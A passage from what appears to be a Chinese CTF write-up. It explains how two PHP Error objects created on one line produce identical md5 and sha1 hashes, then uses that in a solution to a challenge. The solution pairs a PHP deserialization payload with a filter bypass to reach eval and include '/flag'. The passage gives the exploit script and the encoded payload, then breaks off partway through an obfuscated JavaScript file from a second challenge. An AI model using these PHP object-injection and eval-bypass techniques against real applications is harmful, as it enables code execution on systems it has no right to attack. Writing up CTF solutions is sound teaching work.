  final private __clone ( ) : void</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>类属性：</p>
<ul>
<li><p>message：错误消息内容</p>
</li>
<li><p>code：错误代码</p>
</li>
<li><p>file：抛出错误的文件名</p>
</li>
<li><p>line：抛出错误在该文件中的行数</p>
</li>
</ul>
<p>类方法：</p>
<ul>
<li><p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/error.construct.php"><code>Error::__construct</code></a> — 初始化 error 对象</p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/error.getmessage.php"><code>Error::getMessage</code></a> — 获取错误信息</p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/error.getprevious.php"><code>Error::getPrevious</code></a> — 返回先前的 Throwable</p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/error.getcode.php"><code>Error::getCode</code></a> — 获取错误代码</p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/error.getfile.php"><code>Error::getFile</code></a> — 获取错误发生时的文件</p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/error.getline.php"><code>Error::getLine</code></a> — 获取错误发生时的行号</p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/error.gettrace.php"><code>Error::getTrace</code></a> — 获取调用栈（stack trace）</p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/error.gettraceasstring.php"><code>Error::getTraceAsString</code></a> — 获取字符串形式的调用栈（stack trace）</p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/error.tostring.php"><code>Error::__toString</code></a> — error 的字符串表达</p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/error.clone.php"><code>Error::__clone</code></a> — 克隆 error</p>
</li>
</ul>
<h3 id="Exception-类"><a href="#Exception-类" class="headerlink" title="Exception 类"></a>Exception 类</h3><p>类摘要：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Exception &#123;</span><br><span class="line">    /* 属性 */</span><br><span class="line">    protected string $message ;</span><br><span class="line">    protected int $code ;</span><br><span class="line">    protected string $file ;</span><br><span class="line">    protected int $line ;</span><br><span class="line">    /* 方法 */</span><br><span class="line">    public __construct ( string $message = &quot;&quot; , int $code = 0 , Throwable $previous = null )</span><br><span class="line">    final public getMessage ( ) : string</span><br><span class="line">    final public getPrevious ( ) : Throwable</span><br><span class="line">    final public getCode ( ) : mixed</span><br><span class="line">    final public getFile ( ) : string</span><br><span class="line">    final public getLine ( ) : int</span><br><span class="line">    final public getTrace ( ) : array</span><br><span class="line">    final public getTraceAsString ( ) : string</span><br><span class="line">    public __toString ( ) : string</span><br><span class="line">    final private __clone ( ) : void</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>类属性：</strong></p>
<ul>
<li><p>message：异常消息内容</p>
</li>
<li><p>code：异常代码</p>
</li>
<li><p>file：抛出异常的文件名</p>
</li>
<li><p>line：抛出异常在该文件中的行号</p>
</li>
</ul>
<p>类方法：</p>
<ul>
<li><p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/exception.construct.php"><code>Exception::__construct</code></a> — 异常构造函数</p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/exception.getmessage.php"><code>Exception::getMessage</code></a> — 获取异常消息内容</p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/exception.getprevious.php"><code>Exception::getPrevious</code></a> — 返回异常链中的前一个异常</p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/exception.getcode.php"><code>Exception::getCode</code></a> — 获取异常代码</p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/exception.getfile.php"><code>Exception::getFile</code></a> — 创建异常时的程序文件名称</p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/exception.getline.php"><code>Exception::getLine</code></a> — 获取创建的异常所在文件中的行号</p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/exception.gettrace.php"><code>Exception::getTrace</code></a> — 获取异常追踪信息</p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/exception.gettraceasstring.php"><code>Exception::getTraceAsString</code></a> — 获取字符串类型的异常追踪信息</p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/exception.tostring.php"><code>Exception::__toString</code></a> — 将异常对象转换为字符串</p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/exception.clone.php"><code>Exception::__clone</code></a> — 异常克隆</p>
</li>
</ul>
<p>可以看到，在Error和Exception这两个PHP原生类中内只有 <code>__toString</code> 方法，这个方法用于将异常或错误对象转换为字符串。</p>
<p>先以Error为例，看看当它触发了__toString方法时会发生什么：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br></pre></td></tr></table></figure>

<p>输出：</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/62668a93239250f7c598f60a.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/62668a93239250f7c598f60a.png"></a></p>
<p>发现这将会以字符串的形式输出当前报错，包含当前的错误信息（”payload”）以及当前报错的行号（”2”），而传入 <code>Error(&quot;payload&quot;,1)</code> 中的错误代码“1”则没有输出出来。</p>
<p>再看下一个例子：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">1</span>);<span class="variable">$b</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>输出：</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/62668a9f239250f7c59916c0.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/62668a9f239250f7c59916c0.png"></a></p>
<p>可见，<code>$a</code> 和 <code>$b</code> 这两个错误对象本身是不同的，但是 <code>__toString</code> 方法返回的结果是相同的。注意，这里之所以需要在同一行是因为 <code>__toString</code> 返回的数据包含当前行号。</p>
<p>再看下一个例子：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">1</span>);<span class="variable">$b</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;md5($a)=&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;md5($b)=&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;sha1($a)=&#x27;</span>.<span class="title function_ invoke__">sha1</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;sha1($b)=&#x27;</span>.<span class="title function_ invoke__">sha1</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span>===<span class="variable">$b</span>)</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;相同&#x27;</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;不相同&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>输出为：</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/62668aa9239250f7c5993370.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/62668aa9239250f7c5993370.png"></a></p>
<p>可以看到$a即使与$b是不同的对象，但是它们的md5值与sha1值是相同。</p>
<p>如果还有eval函数呢？我们再来构造一个例子：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;?&gt;&lt;?php phpinfo();?&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="variable">$str</span>,<span class="number">1</span>);<span class="variable">$b</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="variable">$str</span>,<span class="number">2</span>);</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>.PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\r\n\r\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我们刚刚发现在输出的内容中包含当前的错误信息’payload’，那假如将’payload’改为<code>?&gt;&lt;?php phpinfo();?&gt;</code>，那么此时$a的值应该是：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Error: ?&gt;&lt;?php phpinfo();?&gt; ?&gt; in D:\phpstudy_pro\WWW\test1.php:3 Stack trace: #0 &#123;main&#125;</span><br></pre></td></tr></table></figure>

<p>此时我们我们就成功构造了一个查看phpinfo的php代码，需要注意的是我们的payload前面还有<code>?&gt;</code> 字符串是因为我们需要利用?&gt;来将前面的&lt;?php闭合， <code>Exception</code> 类与 <code>Error</code> 的 <code>__toString</code> 方法在eval()函数中输出的结果是不可能控的，即输出的报错信息中，payload前面还有一段杂乱信息“Error: ”：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Error: payload in /var/www/html/tmp/index.php:2</span><br><span class="line">Stack trace:</span><br><span class="line">#0 &#123;main&#125;</span><br></pre></td></tr></table></figure>

<p>进入<code>eval()</code>函数会类似于：<code>eval(&quot;...Error: &lt;?=include &#39;/flag&#39;?&gt;&quot;)</code> ，所以需要用?&gt;闭合一下，也就是<code>&lt;?php ...... eval(&quot;...Error: ?&gt;&lt;?=include &#39;/flag&#39;?&gt;&quot;)</code> ，这样我们的命令就可以成功执行了：</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/62668ab6239250f7c59954ff.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/62668ab6239250f7c59954ff.png"></a></p>
<p>成功查看phpinfo。</p>
<p>Expetion类也与Error的使用和结果完全一样，大家可以自己去尝试以下。</p>
<h3 id="Getflag"><a href="#Getflag" class="headerlink" title="Getflag"></a>Getflag</h3><p>因为Expetion类的使用版本是php5和php7，Error类的使用版本是php7，所以我们需要查看相应的题目环境来判断应该使用哪一个。在这道题目中，php版本是7.2.34，我们可以选择使用Error类。</p>
<p>接着我们审计代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>( (<span class="variable language_">$this</span>-&gt;a != <span class="variable language_">$this</span>-&gt;b) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;a) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;b)) )&#123;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;a)=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;b))) &#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\)|\(|\&#x27;|\&quot;|\&lt;\?php|post|get/&quot;</span>, <span class="variable">$this</span>-&gt;a, <span class="variable">$match</span>))&#123;</span><br><span class="line">           <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="keyword">die</span>(<span class="string">&quot;Get out,Hacker!!!!!&quot;</span>);</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里对a变量与b变量进行了判断，这些判断直接用Error类即可绕过，接着看下面的过滤：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\)|\(|\&#x27;|\&quot;|\&lt;\?php|post|get/&quot;</span>, <span class="variable">$this</span>-&gt;a, <span class="variable">$match</span>))&#123;</span><br><span class="line">           <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="keyword">die</span>(<span class="string">&quot;Get out,Hacker!!!!!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里过滤了一些字符，过滤了括号使得我们无法调用函数，我们可以使用<code>include &#39;/flag&#39;</code> 来获取flag。还过滤了单引号双引号，直接取反绕过即可。还过滤了<code>?&lt;php</code> 这里我们可以利用<code>&lt;?=</code>短标签绕过。给出EXP：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Snert</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;?&gt;&lt;?=include~&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%d0%99%93%9e%98&quot;</span>).<span class="string">&quot;?&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$o</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="variable">$str</span>,<span class="number">1</span>);<span class="variable">$p</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="variable">$str</span>,<span class="number">2</span>);</span><br><span class="line"><span class="variable">$q</span> = <span class="keyword">new</span> <span class="title class_">Snert</span>();</span><br><span class="line"><span class="variable">$q</span>-&gt;a = <span class="variable">$o</span>;</span><br><span class="line"><span class="variable">$q</span>-&gt;b = <span class="variable">$p</span>;</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$q</span>)));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>执行EXP，得到payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?snert_is_good=O%3A5%3A%22Snert%22%3A2%3A%7Bs%3A1%3A%22a%22%3BO%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A20%3A%22%3F%3E%3C%3F%3Dinclude%7E%D0%99%93%9E%98%3F%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A1%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A29%3A%22D%3A%5Cphpstudy_pro%5CWWW%5Ctest1.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A11%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7Ds%3A1%3A%22b%22%3BO%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A20%3A%22%3F%3E%3C%3F%3Dinclude%7E%D0%99%93%9E%98%3F%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A2%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A29%3A%22D%3A%5Cphpstudy_pro%5CWWW%5Ctest1.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A11%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D%7D</span><br></pre></td></tr></table></figure>

<h2 id="别踩白块儿"><a href="#别踩白块儿" class="headerlink" title="别踩白块儿"></a>别踩白块儿</h2><p>打开环境，是一个别踩白块儿的游戏界面：</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/62668ad2239250f7c5999cc0.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/62668ad2239250f7c5999cc0.png"></a></p>
<p>玩了很久都上不了50分，那么可想而知这个题目不会通过玩游戏拿到flag（不可能是我菜，逃）。</p>
<p>查看网站源码，发现一个可疑的js文件：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> _0xodh=<span class="string">&#x27;jsjiami.com.v6&#x27;</span>,_0xodh_=[<span class="string">&#x27;_0xodh&#x27;</span>],_0x5438=[_0xodh,<span class="string">&#x27;a2NsSVo=&#x27;</span>,<span class="string">&#x27;Q1BnanM=&#x27;</span>,<span class="string">&#x27;LTEwMXB4&#x27;</span>,<span class="string">&#x27;5L2g6LaF56We5LqG77yB&#x27;</span>,<span class="string">&#x27;ZUxGako=&#x27;</span>,<span class="string">&#x27;cGFzcw==&#x27;</span>,<span class="string">&#x27;Smh0Skk=&#x27;</span>,<span class="string">&#x27;a1BuR3U=&#x27;</span>,<span class="string">&#x27;VFNYQ2E=&#x27;</span>,<span class="string">&#x27;eHRRZm0=&#x27;</span>,<span class="string">&#x27;c2NvcmU=&#x27;</span>,<span class="string">&#x27;ICAg5ZOI5ZOI77yM5bCx6L+Z5rC05bmz6L+Y5oOz5ou/ZmxhZ++8nw==&#x27;</span>,<span class="string">&#x27;LTQwOHB4&#x27;</span>,<span class="string">&#x27;aU9Kakk=&#x27;</span>,<span class="string">&#x27;dmZvcW4=&#x27;</span>,<span class="string">&#x27;TVFUcWc=&#x27;</span>,<span class="string">&#x27;aW5uZXJIVE1M&#x27;</span>,<span class="string">&#x27;T0pudm4=&#x27;</span>,<span class="string">&#x27;dHhkem4=&#x27;</span>,<span class="string">&#x27;WGRVUUs=&#x27;</span>,<span class="string">&#x27;RXlVR3o=&#x27;</span>,<span class="string">&#x27;c2JxWXU=&#x27;</span>,<span class="string">&#x27;T2NwUm4=&#x27;</span>,<span class="string">&#x27;eW5yVU4=&#x27;</span>,<span class="string">&#x27;WFVlYnI=&#x27;</span>,<span class="string">&#x27;5L2g55qE5pyA57uI5b6X5YiGIA==&#x27;</span>,<span class="string">&#x27;aGRjcU0=&#x27;</span>,<span class="string">&#x27;dFBUemU=&#x27;</span>,<span class="string">&#x27;YmxhY2s=&#x27;</span>,<span class="string">&#x27;dGFyZ2V0&#x27;</span>,<span class="string">&#x27;aW5kZXhPZg==&#x27;</span>,<span class="string">&#x27;Y2xhc3NOYW1l&#x27;</span>,<span class="string">&#x27;UGZzRVg=&#x27;</span>,<span class="string">&#x27;Ylhxb1g=&#x27;</span>,<span class="string">&#x27;eWhOeEY=&#x27;</span>,<span class="string">&#x27;bkR2Q2U=&#x27;</span>,<span class="string">&#x27;Mnw2fDd8MXwzfDV8MHw0&#x27;</span>,<span class="string">&#x27;c3BsaXQ=&#x27;</span>,<span class="string">&#x27;UU5wYlc=&#x27;</span>,<span class="string">&#x27;V2pMaGE=&#x27;</span>,<span class="string">&#x27;cmhBZ2Q=&#x27;</span>,<span class="string">&#x27;TFdUSm0=&#x27;</span>,<span class="string">&#x27;eUx5WUQ=&#x27;</span>,<span class="string">&#x27;dW1UUXo=&#x27;</span>,<span class="string">&#x27;QVJDTkE=&#x27;</span>,<span class="string">&#x27;RXpoTG8=&#x27;</span>,<span class="string">&#x27;Q1BsYks=&#x27;</span>,<span class="string">&#x27;bllwUW0=&#x27;</span>,<span class="string">&#x27;Zm51cXU=&#x27;</span>,<span class="string">&#x27;Z2V0RWxlbWVudEJ5SWQ=&#x27;</span>,<span class="string">&#x27;UExoU3M=&#x27;</span>,<span class="string">&#x27;ZWF0Xw==&#x27;</span>,<span class="string">&#x27;ZV9vbg==&#x27;</span>,<span class="string">&#x27;cmVfZ3I=&#x27;</span>,<span class="string">&#x27;eW91X2E=&#x27;</span>,<span class="string">&#x27;5ri45oiP5bey57uP5byA5aeL77yM5peg6ZyA5YaN5qyh54K55Ye777yB&#x27;</span>,<span class="string">&#x27;TFpjVUs=&#x27;</span>,<span class="string">&#x27;bGZJcks=&#x27;</span>,<span class="string">&#x27;VU96R3E=&#x27;</span>,<span class="string">&#x27;b1BYaFg=&#x27;</span>,<span class="string">&#x27;Q3RQckM=&#x27;</span>,<span class="string">&#x27;bWFpbg==&#x27;</span>,<span class="string">&#x27;V3NNd2s=&#x27;</span>,<span class="string">&#x27;a2poVGc=&#x27;</span>,<span class="string">&#x27;dVB4cGE=&#x27;</span>,<span class="string">&#x27;end1Rm8=&#x27;</span>,<span class="string">&#x27;Q3V0Zmc=&#x27;</span>,<span class="string">&#x27;SGdETFQ=&#x27;</span>,<span class="string">&#x27;VVFQUk0=&#x27;</span>,<span class="string">&#x27;bW92ZSgp&#x27;</span>,<span class="string">&#x27;cm93&#x27;</span>,<span class="string">&#x27;ZVdJUVo=&#x27;</span>,<span class="string">&#x27;b0RqWng=&#x27;</span>,<span class="string">&#x27;RWtGY20=&#x27;</span>,<span class="string">&#x27;UFpOcGI=&#x27;</span>,<span class="string">&#x27;YXBwZW5kQ2hpbGQ=&#x27;</span>,<span class="string">&#x27;bU1pclk=&#x27;</span>,<span class="string">&#x27;QlVuSXM=&#x27;</span>,<span class="string">&#x27;YmxJR2c=&#x27;</span>,<span class="string">&#x27;cExZY3M=&#x27;</span>,<span class="string">&#x27;cGFyZW50Tm9kZQ==&#x27;</span>,<span class="string">&#x27;V21IU2s=&#x27;</span>,<span class="string">&#x27;TGRCT2g=&#x27;</span>,<span class="string">&#x27;aW5zZXJ0QmVmb3Jl&#x27;</span>,<span class="string">&#x27;Zmlyc3RDaGlsZA==&#x27;</span>,<span class="string">&#x27;NHwwfDN8Mnwx&#x27;</span>,<span class="string">&#x27;b25jbGljaw==&#x27;</span>,<span class="string">&#x27;TU96UGo=&#x27;</span>,<span class="string">&#x27;blp6d0M=&#x27;</span>,<span class="string">&#x27;Y2hpbGROb2Rlcw==&#x27;</span>,<span class="string">&#x27;bGVuZ3Ro&#x27;</span>,<span class="string">&#x27;V2VJR2g=&#x27;</span>,<span class="string">&#x27;cmVtb3ZlQ2hpbGQ=&#x27;</span>,<span class="string">&#x27;bGFzdENoaWxk&#x27;</span>,<span class="string">&#x27;WEd6eWw=&#x27;</span>,<span class="string">&#x27;cGFzczE=&#x27;</span>,<span class="string">&#x27;VEJxbVQ=&#x27;</span>,<span class="string">&#x27;Y2VsbA==&#x27;</span>,<span class="string">&#x27;cHJrWXI=&#x27;</span>,<span class="string">&#x27;Zmxvb3I=&#x27;</span>,<span class="string">&#x27;cmFuZG9t&#x27;</span>,<span class="string">&#x27;Y2VsbCBibGFjaw==&#x27;</span>,<span class="string">&#x27;Y29u&#x27;</span>,<span class="string">&#x27;Z2V0Q29tcHV0ZWRTdHlsZQ==&#x27;</span>,<span class="string">&#x27;VGZOdmI=&#x27;</span>,<span class="string">&#x27;c3R5bGU=&#x27;</span>,<span class="string">&#x27;dG9w&#x27;</span>,<span class="string">&#x27;RXhydU4=&#x27;</span>,<span class="string">&#x27;WWVYU3k=&#x27;</span>,<span class="string">&#x27;jsjINiXamFi.czoRm.gWnQv6bptUUF==&#x27;</span>];<span class="keyword">if</span>(<span class="keyword">function</span>(<span class="params">_0x1b0a33,_0x36c283,_0x35fc1f</span>)&#123;<span class="keyword">function</span> <span class="title function_">_0x311d4f</span>(<span class="params">_0x5a9fdd,_0x2292a4,_0x5e7648,_0xcb1fab,_0x6675df,_0x49fb32</span>)&#123;_0x2292a4=_0x2292a4&gt;&gt;<span class="number">0x8</span>,_0x6675df=<span class="string">&#x27;po&#x27;</span>;<span class="keyword">var</span> _0x73c929=<span class="string">&#x27;shift&#x27;</span>,_0x42487a=<span class="string">&#x27;push&#x27;</span>,_0x49fb32=<span class="string">&#x27;0.7gmpnmz84d&#x27;</span>;<span class="keyword">if</span>(_0x2292a4&lt;_0x5a9fdd)&#123;<span class="keyword">while</span>(--_0x5a9fdd)&#123;_0xcb1fab=_0x1b0a33[_0x73c929]();<span class="keyword">if</span>(_0x2292a4===_0x5a9fdd&amp;&amp;_0x49fb32===<span class="string">&#x27;0.7gmpnmz84d&#x27;</span>&amp;&amp;_0x49fb32[<span class="string">&#x27;length&#x27;</span>]===<span class="number">0xc</span>)&#123;_0x2292a4=_0xcb1fab,_0x5e7648=_0x1b0a33[_0x6675df+<span class="string">&#x27;p&#x27;</span>]();&#125;<span class="keyword">else</span> <span class="keyword">if</span>(_0x2292a4&amp;&amp;_0x5e7648[<span class="string">&#x27;replace&#x27;</span>](<span class="regexp">/[INXFzRgWnQbptUUF=]/g</span>,<span class="string">&#x27;&#x27;</span>)===_0x2292a4)&#123;_0x1b0a33[_0x42487a](_0xcb1fab);&#125;&#125;_0x1b0a33[_0x42487a](_0x1b0a33[_0x73c929]());&#125;<span class="keyword">return</span> <span class="number">0xe0d46</span>;&#125;;<span class="keyword">return</span> <span class="title function_">_0x311d4f</span>(++_0x36c283,_0x35fc1f)&gt;&gt;_0x36c283^_0x35fc1f;&#125;(_0x5438,<span class="number">0x1e5</span>,<span class="number">0x1e500</span>),_0x5438)&#123;_0xodh_=_0x5438[<span class="string">&#x27;length&#x27;</span>]^<span class="number">0x1e5</span>;&#125;;<span class="keyword">function</span> <span class="title function_">_0x1d2e</span>(<span class="params">_0x2ecb48,_0x3321f5</span>)&#123;_0x2ecb48=~~<span class="string">&#x27;0x&#x27;</span>[<span 